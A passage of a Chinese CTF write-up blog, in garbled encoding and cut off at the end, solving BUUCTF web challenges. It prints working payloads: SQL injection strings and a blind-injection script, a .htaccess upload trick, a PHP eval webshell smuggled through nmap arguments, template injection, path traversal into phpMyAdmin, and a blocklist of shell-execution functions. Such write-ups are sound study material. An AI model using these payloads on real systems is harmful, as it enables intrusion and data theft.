        <content type="html"><![CDATA[<p>BUUç¬¬ä¸€ä»½</p><span id="more"></span><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h2><p>é¦–å…ˆå°è¯•è¾“å…¥ç‚¹ä¸œè¥¿</p><p>ç»“æœ![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-13">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-13</a> 22.14.07.png)</p><p>å°è¯•ä¸‡èƒ½å¯†ç ![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-13">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-13</a> 22.14.34.png)</p><p>è·‘ä¸€ä¸‹çœ‹çœ‹éƒ½è¿‡æ»¤äº†å•¥</p><pre class="line-numbers language-none"><code class="language-none">è¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: unionè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: andè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: sleepè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: byè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: ifè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: charè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: asciiè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: midè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: substringè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: handlerè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: benchmarkè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: insertè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: *è¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: &#x3D;è¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: \è¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: ç©ºæ ¼<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åªèƒ½å°è¯•æŠ¥é”™æ³¨å…¥äº†</p><pre class="line-numbers language-none"><code class="language-none">1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),15)),0x7e),1))#1&#39;or(updatexml(1,concat(0x7e,(right((select(group_concat(password))from(H4rDsq1)),15)),0x7e),1))#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æŠ¥é”™æ³¨å…¥é™åˆ¶é•¿åº¦ï¼Œç”¨rightå‡½æ•°åˆ‡å‰²</p><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h2><p>å¸ƒå°”ç›²æ³¨</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://40a6cf54-8382-490a-8651-8324677bb273.node4.buuoj.cn:81/index.php"</span>flagchar<span class="token operator">=</span><span class="token string">"flag&#123;-abcdef1234567890&#125;"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagchar<span class="token punctuation">:</span>        data<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">'id'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"if(ascii(substr((select(flag)from(flag)),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">,2,1)"</span></span>        <span class="token punctuation">&#125;</span>        tex<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">"Do you want to be my girlfriend"</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>é¦–å…ˆå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œè¢«è¿‡æ»¤ï¼Œå°è¯•pngå›¾ç‰‡ï¼Œè¿‡æ»¤ï¼Œåªèƒ½ä¸Šä¼ jpegäº†ï¼ŒæˆåŠŸ</p><p>å‘ç°æœåŠ¡å™¨æ˜¯apacheæœåŠ¡å™¨ï¼Œå°è¯•ä¸Šä¼ .htaccessæ–‡ä»¶</p><pre class="line-numbers language-none"><code class="language-none">AddType application&#x2F;x-httpd-php .jpeg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆåŠŸ![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-14">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-14</a> 20.14.17.png)</p><p>æˆåŠŸ</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-14">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-14</a> 20.18.24.png)</p><p>èšå‰‘é“¾æ¥å³å¯</p><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>ä¸Šæ¥ä¸¤ä¸ªå‡½æ•°escapeshellarg()å’Œescapeshellcmd()</p><pre class="line-numbers language-none"><code class="language-none">escapeshellarg()å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œå¹¶ä¸”è¿˜æ˜¯ç¡®ä¿å®‰å…¨çš„ã€‚å¯¹äºç”¨æˆ·è¾“å…¥çš„éƒ¨åˆ†å‚æ•°å°±åº”è¯¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°ã€‚shell å‡½æ•°åŒ…å«exec(),system()æ‰§è¡Œè¿ç®—ç¬¦ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">escapeshellcmd()å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ°exec()æˆ–system()å‡½æ•°ï¼Œæˆ–è€…æ‰§è¡Œæ“ä½œç¬¦ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚åæ–œçº¿ï¼ˆ\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š&amp;#;&#96;|*?~&lt;&gt;^()[]&#123;&#125;$,\x0Aå’Œ\xFFã€‚&#39;å’Œ&quot;ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚ åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ%å’Œ!å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸¤ä¸ªå‡½æ•°ä½¿ç”¨çš„ä¾‹å­</p><pre class="line-numbers language-none"><code class="language-none">åŸå§‹è¾“å…¥ 172.17.0.2&#39; -v -d a&#x3D;1escapeshellargå¤„ç†å &#39;172.17.0.2&#39;&#39;&#39; -v -d a&#x3D;1&#39;escapeshellcmdå¤„ç†å &#39;172.17.0.2&#39;\&#39;&#39; -v -d a&#x3D;1&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>åœ¨æœ¬é¢˜ä¸­ï¼Œä½¿ç”¨çš„nmapæœ‰ä¸€ä¸ªåä¸º-oGçš„å‚æ•°é€‰é¡¹ï¼Œå¯ä»¥å°†nmapçš„å‘½ä»¤å’Œæ‰§è¡Œç»“æœå†™å…¥æ–‡ä»¶</p><pre class="line-numbers language-none"><code class="language-none">payload:?host&#x3D;&#39; &lt;?php @eval($_POST[&quot;kkk&quot;]);?&gt; -oG kkk.php &#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¼ å…¥åå˜ä¸º</p><pre class="line-numbers language-none"><code class="language-none">nmap -T5 -sT -Pn --host-timeout 2 -F &#39;&#39;&lt;?php @eval($_POST[&quot;kkk&quot;]);?&gt; -oG kkk.php&#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>SSTIæ¨¡ç‰ˆæ³¨å…¥ï¼Œä»¥åå­¦äº†åœ¨ç†è§£å§</p><pre class="line-numbers language-none"><code class="language-none">X-Forwarded-For: &#123;&#123;system(&quot;cat &#x2F;flag&quot;)&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>PHPå­—ç¬¦ä¸²è§£ææ¼æ´ï¼ŒæŸ¥çœ‹æ•°æ®åŒ…è®¿é—®calc.php</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-14">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-14</a> 22.29.28.png)</p><p>å°è¯•ä¼ å…¥scandir()æ‰«ææ–‡ä»¶ï¼Œå‘ç°WAFé˜»æŒ¡ï¼Œå°†ä¼ å…¥å‚æ•°ç”±numæ”¹ä¸º numï¼Œphpè·å–åˆ°çš„å‚æ•°åç§°ä¸ºnumè€ŒWAFè·å–åˆ° numï¼Œç»•è¿‡WAFæˆåŠŸï¼Œæ‰«æå‘ç°åœ¨æ ¹ç›®å½•ä¸‹æœ‰f1aggæ–‡ä»¶ï¼Œä½¿ç”¨file_get_contentå‡½æ•°è¯»å–æ–‡ä»¶å³å¯</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-14">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-14</a> 22.35.38.png)</p><h2 id="ç½‘é¼æ¯-2018-Fakebook"><a href="#ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook"></a>[ç½‘é¼æ¯ 2018]Fakebook</h2><p>é¦–å…ˆæ³¨å†Œåè¿›å…¥ï¼Œå‘ç°noç–‘ä¼¼å­˜åœ¨SQLæ³¨å…¥ï¼Œå°è¯•union selectè¢«è¿‡æ»¤ï¼Œå°è¯•union/**/selectæˆåŠŸ</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-15">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-15</a> 13.17.59.png)</p><p>çˆ†å‡ºå›æ˜¾ä½ç½®ï¼Œä»¥åŠä¼¼ä¹ç½‘é¡µå¯¹æ•°æ®åº“å†…å®¹è¿›è¡Œäº†ååºåˆ—åŒ–ï¼Œç¨åå†çœ‹ï¼Œå…ˆè¿›è¡ŒSQLæ³¨å…¥çˆ†å‡ºå†…å®¹</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-15">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-15</a> 13.19.45.png)</p><p>å‘ç°ç”¨æˆ·ä¿¡æ¯æ˜¯è¢«åºåˆ—åŒ–åå­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„ï¼Œä¸‹ä¸€æ­¥åº”å½“å°è¯•æŸ¥çœ‹æºç è¿›è¡Œååºåˆ—åŒ–äº†ï¼Œè®¿é—®robots.txtå‘ç°äº†ç½‘ç«™æºç ï¼Œæºç å¯¹ç”¨æˆ·ä¼ å…¥çš„åšå®¢é“¾æ¥è¿›è¡Œè®¿é—®å¹¶æ¸²æŸ“ï¼Œç›´æ¥å°†é“¾æ¥æ”¹ä¸ºæœ¬åœ°æ–‡ä»¶å¹¶æ¸²æŸ“ï¼Œå¾—åˆ°flag</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-15">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-15</a> 13.30.53.png)</p><h2 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h2><p>é¦–å…ˆçœ‹robots.txtå‘ç°æ²¡æœ‰å†…å®¹ï¼Œæ‰«ç›®å½•æ‰«å‡º.gitï¼ŒçŒœæµ‹æœ‰æºç æ³„éœ²ï¼Œä½¿ç”¨gitHackå¾—åˆ°index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// echo $_GET['exp'];</span>                @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¿˜å·®ä¸€ç‚¹å“¦ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å†å¥½å¥½æƒ³æƒ³ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// highlight_file(__FILE__);</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¬¬ä¸€æ­¥è¿‡æ»¤äº†æ‰€æœ‰ä¼ªåè®®ï¼Œåªèƒ½æ‰§è¡Œå‡½æ•°äº†ï¼Œä¸‹ä¸€æ­¥æŸ¥çœ‹æ­£åˆ™ï¼Œå¤§ä½¬çš„è§£é‡Šå¦‚ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">(?R)æ˜¯å¼•ç”¨å½“å‰è¡¨è¾¾å¼ï¼Œ(?R)? è¿™é‡Œå¤šä¸€ä¸ª?è¡¨ç¤ºå¯ä»¥æœ‰å¼•ç”¨ï¼Œä¹Ÿå¯ä»¥æ²¡æœ‰ã€‚ï¼Œå¼•ç”¨ä¸€æ¬¡æ­£åˆ™åˆ™å˜æˆäº†[a-z,_]+\([a-z,_]+\((?R)?\)\),å¯ä»¥è¿­ä»£ä¸‹å»ï¼Œé‚£ä¹ˆå®ƒæ‰€åŒ¹é…çš„å°±æ˜¯print(echo(1))ã€a(b(c()));ç±»ä¼¼è¿™ç§å¯ä»¥æ‹¬å·å’Œå­—ç¬¦ç»„æˆçš„ï¼Œè¿™å…¶å®æ˜¯æ— å‚æ•°RCEæ¯”è¾ƒå…¸å‹çš„ä¾‹å­<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœ€ç»ˆæˆ‘ä»¬å°±æ˜¯è¦æ„é€ ä¸€ä¸ªæ— å‚åµŒå¥—å‡½æ•°æ‰§è¡Œï¼Œé¦–å…ˆå°è¯•æ‰«ææ–‡ä»¶ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰flagæ–‡ä»¶å­˜åœ¨</p><p>çŸ¥è¯†ç‚¹ï¼šlocaleconvå‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-20">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-20</a> 22.15.48.png)</p><p>é€šè¿‡è¿™ä¸ªå‡½æ•°ç¬¬ä¸€é¡¹æˆ‘ä»¬å¯ä»¥æ‹¿åˆ°.ï¼Œè¿›è€Œå¯ä»¥ä½¿ç”¨scandirå‡½æ•°æ‰«æç›®å½•æ–‡ä»¶</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-20">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-20</a> 22.17.17.png)</p><p>é€šè¿‡currentå–å‡ºç¬¬ä¸€ä½.ï¼Œflag.phpåœ¨å€’æ•°ç¬¬äºŒçš„ä½ç½®ï¼Œå…ˆä½¿ç”¨array_reverseå‡½æ•°å€’è½¬æ’åºï¼Œåœ¨ä½¿ç”¨nextå–ç¬¬äºŒä½ï¼Œä½¿ç”¨hightlight_fileè¯»å‡ºæ–‡ä»¶</p><pre class="line-numbers language-none"><code class="language-none">payload:?exp&#x3D;highlight_file(next(array_reverse(scandir(current(localeconv())))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-20">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-20</a> 22.19.48.png)</p><h2 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h2><p>è¿›å»å°±å‘Šè¯‰ä½ æ•°æ®åº“æ˜¯ç©ºçš„ï¼Œå…ˆæ‰«ä¸ªæ–‡ä»¶å§ï¼Œå‘ç°æœ‰robots.txtå’Œ/phpmyadmin/ï¼Œå…ˆçœ‹robotsï¼Œæç¤ºå»phpinfo.phpï¼Œå°±æ˜¯ä¸ªphpinfoé¡µé¢ï¼Œä¹Ÿæ²¡å•¥æç¤ºï¼Œçœ‹phpmyadminï¼Œæ•°æ®åº“é‡Œè¿˜çœŸæ²¡ä¸œè¥¿</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-22">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-22</a> 15.25.46.png)</p><p>çœ‹WPï¼Œå‘ç°æ˜¯ä¸€ä¸ªå…³äºphpmyadminçš„è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´<a href="https://blog.csdn.net/qq_43579362/article/details/108476182">CVE-2018-12613</a></p><p>å‡ºç°bugçš„ä»£ç ä½ç½®ï¼šphpMyAdmin/index.php</p><p><img src="https://img-blog.csdnimg.cn/20200908202849454.png"></p><p>å¯ä»¥çœ‹åˆ°ä¼ å…¥çš„targetéœ€è¦æ»¡è¶³çš„æ¡ä»¶ï¼š</p><p>1ã€æ˜¯å­—ç¬¦ä¸²</p><p>2ã€æ²¡æœ‰index</p><p>3ã€ä¸<code>target_blacklist</code>ä¸­</p><p>4ã€æ»¡è¶³<code>Core</code>ç±»ä¸­<code>checkPageValidity</code>å‡½æ•°æ£€æŸ¥</p><p>æœ€åä¸€ä¸ªæ¡ä»¶çš„æœ‰å…³ä»£ç å¦‚ä¸‹</p><p><img src="https://img-blog.csdnimg.cn/20200908203030418.png"></p><p>ä¸Šè¿°å‡½æ•°å¯çŸ¥ï¼Œå¦‚æœæƒ³è¦å‡½æ•°è¿”å›çœŸï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹ä¸‰ä¸ªæ¡ä»¶çš„ä»»æ„ä¸€ä¸ª</p><p>1ã€<code>$page</code>å˜é‡å€¼åœ¨<code>$white_list</code>æ•°ç»„ä¸­</p><p>2ã€ç»è¿‡<code>mb_substr()</code>å’Œ<code>mb_strpos()</code>å¤„ç†çš„<code>$pageâ€“&gt;$_page</code>çš„å˜é‡å€¼åœ¨<code>$_whitelist</code>æ•°ç»„ä¸­ï¼Œ</p><p>3ã€ç»è¿‡<code>urldecode(),mb_substr(),mb_strpos()</code>å¤„ç†çš„<code>$pageâ€“&gt;$_page</code>çš„å˜é‡å€¼åœ¨<code>$_whitelist</code>æ•°ç»„ä¸­ï¼Œ</p><p><img src="https://img-blog.csdnimg.cn/20200908204934607.png"></p><p>å¼€å§‹æ„é€ payloadï¼Œå…ˆæŒ‘ä¸€ä¸ªåœ¨whitelistä¸­çš„æ–‡ä»¶db_datadict.phpç„¶ååŠ é—®å·å’Œæˆ‘ä»¬æƒ³è¦åŒ…å«çš„æ–‡ä»¶</p><pre class="line-numbers language-none"><code class="language-none">payload:?target&#x3D;db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-22">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-22</a> 15.45.08.png)</p><h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h2><p>æ‰“å¼€ç½‘ç«™æŸ¥çœ‹æºç ï¼Œå‘ç°æœ‰ä¸€ä¸ªå»¶æ—¶5ç§’æäº¤çš„å‚æ•°ï¼ŒæŠ“åŒ…æŸ¥çœ‹å‚æ•°åç§°å‘ç°å¯èƒ½æ˜¯æ‰§è¡Œå‡½æ•°çš„ä¸œè¥¿ï¼Œå°è¯•highlight_fileè¯»å–é¡µé¢æºç æˆåŠŸ</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?php    $disable_fun &#x3D; array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);    function gettime($func, $p) &#123;        $result &#x3D; call_user_func($func, $p);        $a&#x3D; gettype($result);        if ($a &#x3D;&#x3D; &quot;string&quot;) &#123;            return $result;        &#125; else &#123;return &quot;&quot;;&#125;    &#125;    class Test &#123;        var $p &#x3D; &quot;Y-m-d h:i:s a&quot;;        var $func &#x3D; &quot;date&quot;;        function __destruct() &#123;            if ($this-&gt;func !&#x3D; &quot;&quot;) &#123;                echo gettime($this-&gt;func, $this-&gt;p);            &#125;        &#125;    &#125;    $func &#x3D; $_REQUEST[&quot;func&quot;];    $p &#x3D; $_REQUEST[&quot;p&quot;];    if ($func !&#x3D; null) &#123;        $func &#x3D; strtolower($func);        if (!in_array($func,$disable_fun)) &#123;            echo gettime($func, $p);        &#125;else &#123;            die(&quot;Hacker...&quot;);        &#125;    &#125;    ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿‡æ»¤äº†å¤§éƒ¨åˆ†å±é™©å‡½æ•°ï¼Œç»§ç»­çœ‹å‘ç°æœ‰ä¸€ä¸ªTestç±»åœ¨é”€æ¯æ—¶ä¼šæ‰§è¡Œå‡½æ•°ï¼Œå¯é€šè¿‡ååºåˆ—åŒ–ç»•è¿‡å‡½æ•°ç¦ç”¨</p><p>![](<a 